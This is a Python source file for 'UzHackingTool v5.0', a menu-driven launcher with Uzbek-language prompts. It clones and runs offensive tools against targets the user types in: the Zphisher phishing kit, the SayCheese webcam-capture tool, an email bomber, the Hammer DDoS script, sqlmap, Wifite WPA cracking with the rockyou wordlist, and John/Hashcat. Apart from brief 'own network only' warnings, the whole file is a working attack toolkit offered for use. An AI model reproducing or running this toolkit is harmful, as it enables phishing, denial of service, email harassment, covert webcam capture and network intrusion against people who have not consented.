#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         UzHackingTool v5.0                                     ║
║                      Cyber Razor tomonidan ishlab chiqilgan                     ║
║                     https://github.com/CyberRazor/UzHackingTool                ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import subprocess
import platform
import time
import json
import shutil
import threading
import webbrowser
from pathlib import Path

# GUI uchun (agar mavjud bo'lsa)
try:
    import customtkinter as ctk
    from PIL import Image, ImageDraw, ImageTk
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False
    print("[!] CustomTkinter topilmadi. CLI rejimida ishlaydi.")
    print("[!] O'rnatish uchun: pip install customtkinter pillow")

# ==================== KONFIGURATSIYA ====================
VERSION = "5.0"
AUTHOR = "Cyber Razor"
GITHUB = "https://github.com/CyberRazor/UzHackingTool"
EMAIL = "cyberrazor@proton.me"
YOUTUBE = "https://youtube.com/@cyberrazor"
TELEGRAM = "https://t.me/CyberRazor"

# Papkalar
BASE_DIR = Path(__file__).parent.absolute()
TOOLS_DIR = BASE_DIR / "Tools"
WORDLISTS_DIR = BASE_DIR / "wordlists"
ROCKYOU_PATH = WORDLISTS_DIR / "rockyou.txt"

# Ranglar (CLI uchun)
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'
    BOLD = '\033[1m'
    NC = '\033[0m'

# ==================== YORDAMCHI FUNKSIYALAR ====================
def clear_screen():
    os.system('cls' if platform.system() == "Windows" else 'clear')

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║    ██╗   ██╗███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗                     ║
║    ██║   ██║██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝                     ║
║    ██║   ██║███████╗    ███████║███████║██║     █████╔╝                      ║
║    ██║   ██║╚════██║    ██╔══██║██╔══██║██║     ██╔═██╗                      ║
║    ╚██████╔╝███████║    ██║  ██║██║  ██║╚██████╗██║  ██╗                      ║
║     ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                      ║
║                                                                               ║
║                      ████████╗ ██████╗  ██████╗ ██╗                          ║
║                      ╚══██╔══╝██╔═══██╗██╔═══██╗██║                          ║
║                         ██║   ██║   ██║██║   ██║██║                          ║
║                         ██║   ██║   ██║██║   ██║██║                          ║
║                         ██║   ╚██████╔╝╚██████╔╝███████╗                     ║
║                         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                     ║
║                                                                               ║
║                      v{VERSION} | {AUTHOR}                                    ║
║                      {GITHUB}                                                 ║
╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.NC}
"""
    print(banner)

def print_menu():
    menu = f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════════{Colors.NC}

{Colors.WHITE}[{Colors.GREEN}01{Colors.WHITE}]{Colors.CYAN} 🔧 Kerakli paketlar & Yangilanish
{Colors.WHITE}[{Colors.GREEN}02{Colors.WHITE}]{Colors.CYAN} 🎣 Phishing Tool (Zphisher)
{Colors.WHITE}[{Colors.GREEN}03{Colors.WHITE}]{Colors.CYAN} 📷 WebCam Hack (SayCheese)
{Colors.WHITE}[{Colors.GREEN}04{Colors.WHITE}]{Colors.CYAN} 🔍 Subdomain Scaner (Subfinder)
{Colors.WHITE}[{Colors.GREEN}05{Colors.WHITE}]{Colors.CYAN} 📧 Email Bomber
{Colors.WHITE}[{Colors.GREEN}06{Colors.WHITE}]{Colors.CYAN} 💥 DDOS Hujum (Hammer)
{Colors.WHITE}[{Colors.GREEN}07{Colors.WHITE}]{Colors.CYAN} 📍 IP Ma'lumot (IP-Tracer)
{Colors.WHITE}[{Colors.GREEN}08{Colors.WHITE}]{Colors.CYAN} 🔌 Port Scaner (Nmap)
{Colors.WHITE}[{Colors.GREEN}09{Colors.WHITE}]{Colors.CYAN} 💉 SQL Injeksiya (sqlmap)
{Colors.WHITE}[{Colors.GREEN}10{Colors.WHITE}]{Colors.CYAN} 📡 Wi-Fi Tarmoq xavfsizligi
{Colors.WHITE}[{Colors.GREEN}11{Colors.WHITE}]{Colors.CYAN} 🔓 Wi-Fi Hack (Wifite + Rockyou)
{Colors.WHITE}[{Colors.GREEN}12{Colors.WHITE}]{Colors.CYAN} 🔐 Hash Cracking (John/Hashcat)
{Colors.WHITE}[{Colors.GREEN}13{Colors.WHITE}]{Colors.CYAN} 📺 Qanday ishlatish? (Video)
{Colors.WHITE}[{Colors.GREEN}14{Colors.WHITE}]{Colors.CYAN} 🗑️ Yuklangan dasturlarni o'chirish
{Colors.WHITE}[{Colors.GREEN}15{Colors.WHITE}]{Colors.CYAN} 🌐 DNS Lookup
{Colors.WHITE}[{Colors.GREEN}16{Colors.WHITE}]{Colors.CYAN} 📋 Whois ma'lumot
{Colors.WHITE}[{Colors.GREEN}17{Colors.WHITE}]{Colors.CYAN} 🗺️ Geolocation
{Colors.WHITE}[{Colors.GREEN}18{Colors.WHITE}]{Colors.CYAN} 🖥️ GUI Rejimi (Agar mavjud bo'lsa)
{Colors.WHITE}[{Colors.GREEN}00{Colors.WHITE}]{Colors.RED} 🚪 Chiqish

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════════{Colors.NC}
"""
    print(menu)

def download_rockyou():
    """Rockyou wordlist ni yuklash"""
    if ROCKYOU_PATH.exists():
        print(f"{Colors.GREEN}✅ Rockyou wordlist allaqachon mavjud!{Colors.NC}")
        return True
    
    print(f"{Colors.YELLOW}📥 Rockyou wordlist yuklanmoqda... (bu biroz vaqt olishi mumkin){Colors.NC}")
    WORDLISTS_DIR.mkdir(parents=True, exist_ok=True)
    
    # Rockyou ni turli manbalardan yuklash
    urls = [
        "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
        "https://downloads.skullsecurity.org/passwords/rockyou.txt.bz2",
    ]
    
    for url in urls:
        try:
            subprocess.run(["wget", "-O", str(ROCKYOU_PATH), url], check=False, timeout=300)
            if ROCKYOU_PATH.exists() and ROCKYOU_PATH.stat().st_size > 1000000:
                print(f"{Colors.GREEN}✅ Rockyou wordlist yuklandi!{Colors.NC}")
                return True
        except:
            continue
    
    # Agar yuklanmasa, bzip2 versiyasini ochish
    bz2_path = WORDLISTS_DIR / "rockyou.txt.bz2"
    if bz2_path.exists():
        subprocess.run(["bunzip2", str(bz2_path)], check=False)
    
    # Agar hali ham yo'q bo'lsa, kichik wordlist yaratish
    if not ROCKYOU_PATH.exists():
        print(f"{Colors.YELLOW}⚠️ Rockyou yuklanmadi. Kichik wordlist yaratilmoqda...{Colors.NC}")
        with open(ROCKYOU_PATH, 'w') as f:
            common_passwords = [
                "123456", "password", "123456789", "12345", "12345678", "qwerty",
                "abc123", "111111", "admin", "welcome", "password123", "admin123"
            ]
            for pwd in common_passwords:
                f.write(pwd + "\n")
        print(f"{Colors.GREEN}✅ Kichik wordlist yaratildi!{Colors.NC}")
    
    return ROCKYOU_PATH.exists()

def clone_or_pull(repo_url, folder_name):
    """Git repositoriyasini clone yoki pull qilish"""
    repo_path = TOOLS_DIR / folder_name
    
    if repo_path.exists():
        print(f"{Colors.YELLOW}📦 {folder_name} yangilanmoqda...{Colors.NC}")
        subprocess.run(["git", "-C", str(repo_path), "pull"], check=False, capture_output=True)
    else:
        print(f"{Colors.YELLOW}📥 {folder_name} o'rnatilmoqda...{Colors.NC}")
        subprocess.run(["git", "clone", repo_url, str(repo_path)], check=False, capture_output=True)
    
    return repo_path

def install_packages():
    """Kerakli paketlarni o'rnatish"""
    clear_screen()
    print(f"{Colors.GREEN}{Colors.BOLD}═══════════════════════════════════════════════════════════{Colors.NC}")
    print(f"{Colors.YELLOW}🔧 Kerakli paketlar o'rnatilmoqda...{Colors.NC}")
    print(f"{Colors.GREEN}{Colors.BOLD}═══════════════════════════════════════════════════════════{Colors.NC}")
    
    system = platform.system()
    
    try:
        if system == "Linux":
            if shutil.which("apt"):
                subprocess.run(["sudo", "apt", "update"], check=False)
                subprocess.run(["sudo", "apt", "install", "-y", "git", "python3", "python3-pip", "curl", "wget", "nmap", "aircrack-ng", "hashcat", "john", "tor"], check=False)
            elif shutil.which("pacman"):
                subprocess.run(["sudo", "pacman", "-Syu", "--noconfirm", "git", "python", "python-pip", "curl", "wget", "nmap", "aircrack-ng", "hashcat", "john", "tor"], check=False)
            elif shutil.which("dnf"):
                subprocess.run(["sudo", "dnf", "install", "-y", "git", "python3", "python3-pip", "curl", "wget", "nmap", "aircrack-ng", "hashcat", "john", "tor"], check=False)
        
        elif "Android" in system or "Termux" in system:
            subprocess.run(["pkg", "update", "-y"], check=False)
            subprocess.run(["pkg", "install", "-y", "git", "python", "python-pip", "curl", "wget", "nmap", "tor"], check=False)
        
        # Python paketlari
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=False)
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "colorama", "dnspython", "python-whois", "customtkinter", "pillow"], check=False)
        
        # Rockyou ni yuklash
        download_rockyou()
        
        print(f"{Colors.GREEN}✅ Barcha kerakli paketlar o'rnatildi!{Colors.NC}")
    
    except Exception as e:
        print(f"{Colors.RED}❌ Xato: {e}{Colors.NC}")
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_phishing():
    clear_screen()
    print(f"{Colors.YELLOW}🎣 Phishing tool ochilmoqda...{Colors.NC}")
    repo = clone_or_pull("https://github.com/htr-tech/zphisher", "zphisher")
    os.chdir(repo)
    subprocess.run(["bash", "zphisher.sh"])
    os.chdir(BASE_DIR)

def run_webcam():
    clear_screen()
    print(f"{Colors.YELLOW}📷 WebCam hack ochilmoqda...{Colors.NC}")
    repo = clone_or_pull("https://github.com/hangetzzu/saycheese", "saycheese")
    os.chdir(repo)
    subprocess.run(["bash", "saycheese.sh"])
    os.chdir(BASE_DIR)

def run_subdomain():
    clear_screen()
    print(f"{Colors.YELLOW}🔍 Subdomain skaneri...{Colors.NC}")
    
    if shutil.which("subfinder") is None:
        print(f"{Colors.YELLOW}Subfinder o'rnatilmoqda...{Colors.NC}")
        subprocess.run(["go", "install", "-v", "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"], check=False)
    
    domain = input(f"{Colors.CYAN}Domain nomini kiriting (masalan: example.com): {Colors.NC}")
    if domain:
        subprocess.run(["subfinder", "-d", domain, "-o", "subdomains.txt"], check=False)
        print(f"{Colors.GREEN}✅ Subdomainlar subdomains.txt fayliga saqlandi{Colors.NC}")
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_email_bomber():
    clear_screen()
    print(f"{Colors.YELLOW}📧 Email Bomber...{Colors.NC}")
    repo = clone_or_pull("https://github.com/4shadoww/bomber", "bomber")
    
    email = input(f"{Colors.CYAN}Email manzilni kiriting: {Colors.NC}")
    if email:
        os.chdir(repo)
        subprocess.run([sys.executable, "bomber.py", email])
        os.chdir(BASE_DIR)
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_ddos():
    clear_screen()
    print(f"{Colors.YELLOW}💥 DDOS Tool...{Colors.NC}")
    repo = clone_or_pull("https://github.com/cyweb/hammer", "hammer")
    
    target = input(f"{Colors.CYAN}IP yoki Domain: {Colors.NC}")
    port = input(f"{Colors.CYAN}Port (default 80): {Colors.NC}") or "80"
    
    if target:
        print(f"{Colors.RED}⚠️ DDOS hujumi qonuniy emas! Faqat o'z tarmog'ingizda sinov uchun!{Colors.NC}")
        os.chdir(repo)
        subprocess.run([sys.executable, "hammer.py", "-s", target, "-p", port, "-t", "135"])
        os.chdir(BASE_DIR)
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_ip_info():
    clear_screen()
    print(f"{Colors.YELLOW}📍 IP Tracer...{Colors.NC}")
    
    ip = input(f"{Colors.CYAN}IP manzilni kiriting: {Colors.NC}")
    if ip:
        try:
            import requests
            response = requests.get(f"http://ip-api.com/json/{ip}")
            data = response.json()
            if data['status'] == 'success':
                print(f"{Colors.GREEN}IP: {Colors.NC}{data.get('query')}")
                print(f"{Colors.GREEN}Mamlakat: {Colors.NC}{data.get('country')}")
                print(f"{Colors.GREEN}Shahar: {Colors.NC}{data.get('city')}")
                print(f"{Colors.GREEN}Provayder: {Colors.NC}{data.get('isp')}")
                print(f"{Colors.GREEN}Koordinatalar: {Colors.NC}{data.get('lat')}, {data.get('lon')}")
            else:
                print(f"{Colors.RED}Ma'lumot topilmadi{Colors.NC}")
        except Exception as e:
            print(f"{Colors.RED}Xato: {e}{Colors.NC}")
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_port_scan():
    clear_screen()
    print(f"{Colors.YELLOW}🔌 Port Scaner...{Colors.NC}")
    target = input(f"{Colors.CYAN}Target IP/Domain: {Colors.NC}")
    if target and shutil.which("nmap"):
        subprocess.run(["nmap", "-sC", "-sV", "-O", target])
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_sqlmap():
    clear_screen()
    print(f"{Colors.YELLOW}💉 SQLmap...{Colors.NC}")
    repo = clone_or_pull("https://github.com/sqlmapproject/sqlmap", "sqlmap")
    
    url = input(f"{Colors.CYAN}Target URL: {Colors.NC}")
    if url:
        os.chdir(repo)
        subprocess.run([sys.executable, "sqlmap.py", "-u", url, "--batch"])
        os.chdir(BASE_DIR)
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_wifi_security():
    """Wi-Fi tarmoq xavfsizligi"""
    clear_screen()
    print(f"{Colors.YELLOW}📡 Wi-Fi tahlil qilish...{Colors.NC}")
    print(f"{Colors.RED}⚠️ Bu faqat o'z tarmog'ingizda sinov uchun!{Colors.NC}")
    
    if platform.system() == "Linux" and shutil.which("airmon-ng"):
        print(f"{Colors.CYAN}1. Wi-Fi adapterini monitor rejimiga o'tkazish{Colors.NC}")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False)
        subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], check=False)
        
        print(f"{Colors.CYAN}2. Wi-Fi tarmoqlarni skanerlash...{Colors.NC}")
        subprocess.run(["sudo", "airodump-ng", "wlan0mon"])
    else:
        print(f"{Colors.YELLOW}Wi-Fi tahlil qilish uchun Linux va aircrack-ng kerak{Colors.NC}")
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_wifite():
    """Wifite bilan Wi-Fi hack - Rockyou bilan"""
    clear_screen()
    print(f"{Colors.YELLOW}🔓 Wifite - Wi-Fi penetration testing{Colors.NC}")
    print(f"{Colors.RED}⚠️ BU FAQAT O'Z TARMOQINGIZDA SINOV UCHUN!{Colors.NC}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.NC}")
    
    # Rockyou ni tekshirish
    download_rockyou()
    
    # Wifite ni o'rnatish
    repo = clone_or_pull("https://github.com/derv82/wifite2", "wifite2")
    
    print(f"{Colors.CYAN}Wifite menyusi:{Colors.NC}")
    print(f"  {Colors.GREEN}[1]{Colors.NC} Barcha tarmoqlarni skanerlash")
    print(f"  {Colors.GREEN}[2]{Colors.NC} WPA/WPA2 hujumi (rockyou bilan)")
    print(f"  {Colors.GREEN}[3]{Colors.NC} WEP hujumi")
    print(f"  {Colors.GREEN}[4]{Colors.NC} Qo'lda sozlash")
    
    choice = input(f"{Colors.YELLOW}Tanlov: {Colors.NC}")
    
    if choice == "1":
        subprocess.run(["sudo", "python3", str(repo / "wifite.py"), "--scan"])
    elif choice == "2":
        subprocess.run(["sudo", "python3", str(repo / "wifite.py"), "--wpa", "--dict", str(ROCKYOU_PATH)])
    elif choice == "3":
        subprocess.run(["sudo", "python3", str(repo / "wifite.py"), "--wep"])
    elif choice == "4":
        extra = input(f"{Colors.CYAN}Qo'shimcha parametrlar: {Colors.NC}")
        subprocess.run(["sudo", "python3", str(repo / "wifite.py")] + extra.split())
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_hash_cracking():
    """Hash cracking (John/Hashcat)"""
    clear_screen()
    print(f"{Colors.YELLOW}🔐 Hash Cracking Tool{Colors.NC}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.NC}")
    
    download_rockyou()
    
    print(f"{Colors.GREEN}1. John the Ripper{Colors.NC}")
    print(f"{Colors.GREEN}2. Hashcat{Colors.NC}")
    print(f"{Colors.GREEN}3. MD5 Decrypt (Online){Colors.NC}")
    
    choice = input(f"{Colors.YELLOW}Tanlov: {Colors.NC}")
    hash_file = input(f"{Colors.CYAN}Hash fayl yo'li: {Colors.NC}")
    
    if choice == "1" and shutil.which("john"):
        subprocess.run(["john", "--wordlist=" + str(ROCKYOU_PATH), hash_file])
    elif choice == "2" and shutil.which("hashcat"):
        hash_type = input(f"{Colors.CYAN}Hash turi (0=MD5, 1000=NTLM, 1400=SHA256): {Colors.NC}")
        subprocess.run(["hashcat", "-m", hash_type, "-a", "0", hash_file, str(ROCKYOU_PATH)])
    elif choice == "3":
        hash_value = input(f"{Colors.CYAN}MD5 hash qiymati: {Colors.NC}")
        import hashlib
        try:
            with open(ROCKYOU_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if hashlib.md5(word.encode()).hexdigest() == hash_value:
                        print(f"{Colors.GREEN}✅ Topildi: {word}{Colors.NC}")
                        break
                else:
                    print(f"{Colors.RED}❌ Topilmadi{Colors.NC}")
        except Exception as e:
            print(f"{Colors.RED}Xato: {e}{Colors.NC}")
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_howto():
    clear_screen()
    print(f"{Colors.CYAN}📺 Video qo'llanmalar:{Colors.NC}")
    print(f"  {Colors.GREEN}YouTube: {YOUTUBE}{Colors.NC}")
    print(f"  {Colors.GREEN}Telegram: {TELEGRAM}{Colors.NC}")
    webbrowser.open(YOUTUBE)
    
    print(f"{Colors.YELLOW}5 soniyadan so'ng menyuga qaytish...{Colors.NC}")
    time.sleep(5)

def remove_tools():
    clear_screen()
    print(f"{Colors.RED}🗑️ Yuklangan dasturlar o'chirilmoqda...{Colors.NC}")
    
    if TOOLS_DIR.exists():
        shutil.rmtree(TOOLS_DIR)
        print(f"{Colors.GREEN}✅ Barcha yuklangan dasturlar o'chirildi!{Colors.NC}")
    else:
        print(f"{Colors.YELLOW}Hech qanday dastur topilmadi{Colors.NC}")
    
    time.sleep(2)

def run_dns_lookup():
    clear_screen()
    print(f"{Colors.YELLOW}🌐 DNS Lookup{Colors.NC}")
    domain = input(f"{Colors.CYAN}Domain: {Colors.NC}")
    
    if domain:
        import dns.resolver
        for record in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']:
            try:
                answers = dns.resolver.resolve(domain, record)
                print(f"{Colors.GREEN}{record}:{Colors.NC}")
                for rdata in answers:
                    print(f"  {rdata}")
            except:
                pass
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_whois():
    clear_screen()
    print(f"{Colors.YELLOW}📋 Whois ma'lumot{Colors.NC}")
    domain = input(f"{Colors.CYAN}Domain: {Colors.NC}")
    
    if domain:
        try:
            import whois
            w = whois.whois(domain)
            print(f"{Colors.GREEN}Domain: {Colors.NC}{w.domain_name}")
            print(f"{Colors.GREEN}Registrator: {Colors.NC}{w.registrar}")
            print(f"{Colors.GREEN}Yaratilgan: {Colors.NC}{w.creation_date}")
            print(f"{Colors.GREEN}Tugash vaqti: {Colors.NC}{w.expiration_date}")
        except Exception as e:
            print(f"{Colors.RED}Xato: {e}{Colors.NC}")
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_geolocation():
    clear_screen()
    print(f"{Colors.YELLOW}🗺️ Geolocation{Colors.NC}")
    ip = input(f"{Colors.CYAN}IP manzil (bosh qoldirsangiz sizning IP): {Colors.NC}")
    
    try:
        import requests
        url = f"http://ip-api.com/json/{ip}" if ip else "http://ip-api.com/json/"
        data = requests.get(url).json()
        if data['status'] == 'success':
            print(f"{Colors.GREEN}IP: {Colors.NC}{data.get('query')}")
            print(f"{Colors.GREEN}Mamlakat: {Colors.NC}{data.get('country')}")
            print(f"{Colors.GREEN}Shahar: {Colors.NC}{data.get('city')}")
            print(f"{Colors.GREEN}Provayder: {Colors.NC}{data.get('isp')}")
        else:
            print(f"{Colors.RED}Ma'lumot topilmadi{Colors.NC}")
    except Exception as e:
        print(f"{Colors.RED}Xato: {e}{Colors.NC}")
    
    input(f"{Colors.YELLOW}Davom etish uchun Enter bosing...{Colors.NC}")

def run_gui():
    """GUI rejimini ishga tushirish"""
    if GUI_AVAILABLE:
        try:
            from gui_uzhacking import UZHackingGUI
            app = UZHackingGUI()
            app.mainloop()
        except ImportError:
            print(f"{Colors.RED}GUI fayli topilmadi. CLI rejimida davom etiladi.{Colors.NC}")
            time.sleep(2)
            main_cli()
    else:
        print(f"{Colors.RED}GUI uchun kerakli paketlar o'rnatilmagan.{Colors.NC}")
        print(f"{Colors.YELLOW}O'rnatish uchun: pip install customtkinter pillow{Colors.NC}")
        input(f"{Colors.YELLOW}Enter bosing...{Colors.NC}")

def exit_tool():
    clear_screen()
    print(f"{Colors.GREEN}{Colors.BOLD}")
    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║                                                                    ║")
    print("║     UzHackingTool dan foydalanganingiz uchun rahmat!               ║")
    print("║     Cyber Razor - Xavfsizlik va pentesting vositalari              ║")
    print("║                                                                    ║")
    print("║     🌐 GitHub: " + GITHUB + "║")
    print("║     📺 YouTube: " + YOUTUBE + "║")
    print("║                                                                    ║")
    print("╚════════════════════════════════════════════════════════════════════╝")
    print(f"{Colors.NC}")
    sys.exit(0)

def main_cli():
    """CLI rejimi asosiy funksiyasi"""
    TOOLS_DIR.mkdir(parents=True, exist_ok=True)
    
    while True:
        try:
            clear_screen()
            print_banner()
            print_menu()
            
            choice = input(f"{Colors.YELLOW}UzHackingTool{Colors.NC} {Colors.CYAN}➜{Colors.NC} ")
            
            if choice in ['1', '01']:
                install_packages()
            elif choice in ['2', '02']:
                run_phishing()
            elif choice in ['3', '03']:
                run_webcam()
            elif choice in ['4', '04']:
                run_subdomain()
            elif choice in ['5', '05']:
                run_email_bomber()
            elif choice in ['6', '06']:
                run_ddos()
            elif choice in ['7', '07']:
                run_ip_info()
            elif choice in ['8', '08']:
                run_port_scan()
            elif choice in ['9', '09']:
                run_sqlmap()
            elif choice in ['10', '10']:
                run_wifi_security()
            elif choice in ['11', '11']:
                run_wifite()
            elif choice in ['12', '12']:
                run_hash_cracking()
            elif choice in ['13', '13']:
                run_howto()
            elif choice in ['14', '14']:
                remove_tools()
            elif choice in ['15', '15']:
                run_dns_lookup()
            elif choice in ['16', '16']:
                run_whois()
            elif choice in ['17', '17']:
                run_geolocation()
            elif choice in ['18', '18']:
                run_gui()
            elif choice in ['0', '00']:
                exit_tool()
            else:
                print(f"{Colors.RED}❌ Xato! Iltimos, 0-18 oralig'ida raqam kiriting!{Colors.NC}")
                time.sleep(1)
        
        except KeyboardInterrupt:
            exit_tool()
        except Exception as e:
            print(f"{Colors.RED}❌ Xato: {e}{Colors.NC}")
            time.sleep(2)

def main():
    """Asosiy dastur"""
    try:
        main_cli()
    except Exception as e:
        print(f"{Colors.RED}Kutilmagan xato: {e}{Colors.NC}")
        sys.exit(1)

if __name__ == "__main__":
    main()